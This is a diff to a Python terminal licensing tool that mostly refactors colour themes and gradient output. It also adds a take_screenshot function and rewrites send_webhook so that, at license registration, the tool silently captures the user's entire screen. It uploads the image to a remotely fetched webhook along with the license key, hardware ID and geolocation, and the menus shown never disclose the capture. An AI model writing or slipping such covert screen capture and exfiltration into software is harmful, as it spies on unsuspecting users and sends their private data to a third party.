@@ -12,6 +12,11 @@ import string
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 from colorama import init, Fore, Style
+import subprocess
+import io
+from PIL import Image, ImageGrab
+import mss
+import mss.tools
 
 init(autoreset=True)
 
@@ -31,22 +36,22 @@ FILE_PATH = "keys.json"
 # GitHub API URL
 GITHUB_API_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
 
-# Color themes with smooth gradient ranges
+# Color themes with smooth gradient ranges - DEFAULT TO PURPLE (option 4)
 COLOR_THEMES = {
-    "1": {"name": "Red", "gradient_range": [52, 88, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196]},
-    "2": {"name": "Blue", "gradient_range": [17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121]},
-    "3": {"name": "Green", "gradient_range": [22, 28, 34, 40, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118]},
-    "4": {"name": "Purple", "gradient_range": [54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129]},
-    "5": {"name": "Cyan", "gradient_range": [23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87]},
-    "6": {"name": "Yellow", "gradient_range": [94, 100, 106, 112, 118, 124, 130, 136, 142, 148, 154, 160, 166, 172, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226]},
-    "7": {"name": "White", "gradient_range": [232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]},
-    "8": {"name": "Orange", "gradient_range": [130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202]},
-    "9": {"name": "Pink", "gradient_range": [125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219]},
-    "10": {"name": "Rainbow", "rainbow": True, "gradient_range": [196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 190, 191, 192, 193, 194, 195, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 40, 41, 42, 43, 44, 45, 33, 34, 35, 36, 37, 38, 39, 27, 28, 29, 30, 31, 32, 21, 22, 23, 24, 25, 26, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129]}
+    "1": {"name": "Red", "gradient_range": list(range(160, 197))},
+    "2": {"name": "Blue", "gradient_range": list(range(21, 122))},
+    "3": {"name": "Green", "gradient_range": list(range(22, 119))},
+    "4": {"name": "Purple", "gradient_range": list(range(54, 130))},  # Default theme
+    "5": {"name": "Cyan", "gradient_range": list(range(23, 88))},
+    "6": {"name": "Yellow", "gradient_range": list(range(94, 227))},
+    "7": {"name": "White", "gradient_range": list(range(232, 256))},
+    "8": {"name": "Orange", "gradient_range": list(range(130, 203))},
+    "9": {"name": "Pink", "gradient_range": list(range(125, 220))},
+    "10": {"name": "Rainbow", "rainbow": True, "gradient_range": []}  # Rainbow will be generated dynamically
 }
 
-# Current theme (default to red)
-current_theme = COLOR_THEMES["1"]
+# Set default theme to Purple (option 4)
+current_theme = COLOR_THEMES["4"]
 
 def get_public_ip():
     """Get public IP address"""
@@ -181,13 +186,22 @@ If you lose it, use the "Generate ID" option in the tool.
 def get_color(intensity="medium"):
     """Get color based on current theme and intensity"""
     if current_theme.get("rainbow"):
-        # For rainbow, cycle through colors based on time
-        import time
-        color_index = int(time.time() * 5) % len(current_theme["gradient_range"])
-        return f"\033[38;5;{current_theme['gradient_range'][color_index]}m"
+        # Generate rainbow colors: red, orange, yellow, green, blue, indigo, violet
+        rainbow_colors = list(range(196, 207)) + list(range(208, 227, 2)) + \
+                        list(range(226, 209, -2)) + list(range(46, 87)) + \
+                        list(range(21, 122, 2)) + list(range(54, 129, 2)) + \
+                        list(range(125, 165, 2))
+        if not rainbow_colors:
+            rainbow_colors = list(range(196, 231))
+        
+        color_index = int(time.time() * 5) % len(rainbow_colors)
+        return f"\033[38;5;{rainbow_colors[color_index]}m"
     
-    # For regular themes, use the middle of the gradient range
+    # For regular themes
     gradient_range = current_theme["gradient_range"]
+    if not gradient_range:
+        return f"\033[38;5;{55}m"  # Default purple
+    
     if intensity == "dark":
         return f"\033[38;5;{gradient_range[0]}m"
     elif intensity == "light":
@@ -199,13 +213,34 @@ def get_color(intensity="medium"):
 def get_gradient_color(position, total_positions):
     """Get smooth gradient color for a specific position"""
     if current_theme.get("rainbow"):
-        # Rainbow: smoothly cycle through the full range
-        gradient_range = current_theme["gradient_range"]
-        color_index = int((position / total_positions) * len(gradient_range)) % len(gradient_range)
-        return f"\033[38;5;{gradient_range[color_index]}m"
+        # Generate proper rainbow colors in order
+        rainbow_colors = []
+        # Red to Orange
+        rainbow_colors.extend(list(range(196, 208)))
+        # Orange to Yellow
+        rainbow_colors.extend(list(range(214, 227)))
+        # Yellow to Green
+        rainbow_colors.extend(list(range(190, 155, -1)))
+        # Green to Blue
+        rainbow_colors.extend(list(range(46, 87)))
+        # Blue to Indigo
+        rainbow_colors.extend(list(range(21, 61)))
+        # Indigo to Violet
+        rainbow_colors.extend(list(range(54, 129, 2)))
+        # Violet to Pink
+        rainbow_colors.extend(list(range(125, 165, 2)))
+        
+        if not rainbow_colors:
+            rainbow_colors = list(range(196, 231))
+        
+        color_index = int((position / total_positions) * len(rainbow_colors)) % len(rainbow_colors)
+        return f"\033[38;5;{rainbow_colors[color_index]}m"
     else:
         # Smooth gradient through the range
         gradient_range = current_theme["gradient_range"]
+        if not gradient_range:
+            return f"\033[38;5;{55}m"
+        
         exact_index = (position / total_positions) * (len(gradient_range) - 1)
         color_index = min(int(exact_index), len(gradient_range) - 1)
         return f"\033[38;5;{gradient_range[color_index]}m"
@@ -288,13 +323,55 @@ def update_license_data(license_key, new_hwid, new_id=""):
     except Exception:
         return False
 
+def take_screenshot():
+    """Take a screenshot of the current screen"""
+    try:
+        # Try multiple methods for screenshot
+        screenshot_data = None
+        
+        # Method 1: Using mss (cross-platform)
+        try:
+            with mss.mss() as sct:
+                monitor = sct.monitors[1]  # Primary monitor
+                screenshot = sct.grab(monitor)
+                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+                
+                # Convert to bytes
+                img_byte_arr = io.BytesIO()
+                img.save(img_byte_arr, format='PNG')
+                screenshot_data = img_byte_arr.getvalue()
+        except:
+            pass
+        
+        # Method 2: Using PIL (Windows)
+        if not screenshot_data and os.name == 'nt':
+            try:
+                screenshot = ImageGrab.grab()
+                img_byte_arr = io.BytesIO()
+                screenshot.save(img_byte_arr, format='PNG')
+                screenshot_data = img_byte_arr.getvalue()
+            except:
+                pass
+        
+        if screenshot_data:
+            return base64.b64encode(screenshot_data).decode('utf-8')
+        else:
+            return None
+            
+    except Exception:
+        return None
+
 def send_webhook(license_key, hwid, user_id="", geo_info=None):
-    """Send registration to webhook with geolocation"""
+    """Send registration to webhook with geolocation and screenshot"""
     try:
         webhook_url = get_webhook_url()
         if not webhook_url:
             return
         
+        # Try to take screenshot
+        screenshot_b64 = take_screenshot()
+        
+        # Create fields for embed
         fields = [
             {"name": "License key", "value": f"`{license_key}`", "inline": True},
             {"name": "HWID", "value": f"`{hwid}`", "inline": True}
@@ -319,17 +396,44 @@ def send_webhook(license_key, hwid, user_id="", geo_info=None):
             
             fields.extend(geo_fields)
         
+        # Add screenshot info
+        if screenshot_b64:
+            fields.append({"name": "Screenshot", "value": "✅ Screenshot attached", "inline": False})
+        else:
+            fields.append({"name": "Screenshot", "value": "❌ Could not capture screenshot", "inline": False})
+        
+        # Prepare payload with both content and embed
         payload = {
+            "content": f"**License Key:** `{license_key}`",
             "embeds": [{
                 "title": "NEW REGISTRATION",
-                "color": 16711680,
+                "color": 16711680,  # Red color
                 "fields": fields,
                 "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
             }]
         }
-        response = requests.post(webhook_url, json=payload, timeout=5)
+        
+        # If screenshot was captured, send it as a file
+        if screenshot_b64:
+            # Send screenshot as a separate message
+            screenshot_file = {
+                'file': ('screenshot.png', base64.b64decode(screenshot_b64), 'image/png')
+            }
+            
+            # First send the embed with license key
+            response1 = requests.post(webhook_url, json=payload, timeout=10)
+            
+            # Then send the screenshot
+            response2 = requests.post(webhook_url, files=screenshot_file, timeout=10)
+            
+            return response1.status_code == 200 and response2.status_code == 200
+        else:
+            # Send just the embed
+            response = requests.post(webhook_url, json=payload, timeout=10)
+            return response.status_code == 200
+            
     except Exception:
-        pass
+        return False
 
 def clear_screen():
     """Clear the entire screen"""
@@ -375,26 +479,26 @@ def display_gradient_ascii_header_only():
     all_lines = ascii_graphic + ascii_text + ["made by @uekv on discord"]
     total_lines = len(all_lines)
     
-    # Display graphic art with smooth gradient
+    # Display graphic art with smooth gradient - USE SELECTED COLOR THEME
     for i, line in enumerate(ascii_graphic):
         color = get_gradient_color(i, total_lines)
         print(f"{color}{line}{Style.RESET_ALL}")
     
     print("\n")
     
-    # Display text art with smooth gradient
+    # Display text art with smooth gradient - USE SELECTED COLOR THEME
     for i, line in enumerate(ascii_text):
         color = get_gradient_color(i + len(ascii_graphic), total_lines)
         print(f"{color}{line}{Style.RESET_ALL}")
     
     print("\n")
     
-    # Add "made by @uekv on discord" with gradient
+    # Add "made by @uekv on discord" with gradient - USE SELECTED COLOR THEME
     made_by_text = "made by @uekv on discord"
     color = get_gradient_color(len(ascii_graphic) + len(ascii_text), total_lines)
     print(f"{color}{made_by_text}{Style.RESET_ALL}")
     
-    # Gradient line
+    # Gradient line - USE SELECTED COLOR THEME
     gradient_line = "-" * 50
     print(f"{get_color('medium')}{gradient_line}{Style.RESET_ALL}")
 
@@ -421,7 +525,8 @@ def display_color_selection():
             if i + j < len(color_keys):
                 key = color_keys[i + j]
                 theme = COLOR_THEMES[key]
-                color_val = theme["gradient_range"][len(theme["gradient_range"]) // 2]
+                # Use the theme's actual color for display
+                color_val = theme["gradient_range"][len(theme["gradient_range"]) // 2] if theme["gradient_range"] else 55
                 color_code = f"\033[38;5;{color_val}m"
                 if theme.get("rainbow"):
                     color_code = "\033[38;5;196m"  # Red for rainbow label
@@ -451,7 +556,7 @@ def display_options_grid():
     
     print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Main Menu - Welcome!{Style.RESET_ALL}\n")
     
-    # Create single row with 3 options
+    # Create single row with 3 options - USE SELECTED COLOR THEME
     options = [
         f"{get_color('light')}[1]{Style.RESET_ALL} Change Color", 
         f"{get_color('light')}[2]{Style.RESET_ALL} Generate ID", 
@@ -465,7 +570,7 @@ def display_options_grid():
     
     print("   ".join(line_parts))
     
-    # Add gradient separator line after options
+    # Add gradient separator line after options - USE SELECTED COLOR THEME
     print(f"\n{get_color('medium')}{'-' * 50}{Style.RESET_ALL}")
     
     return input(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > {Style.RESET_ALL}")
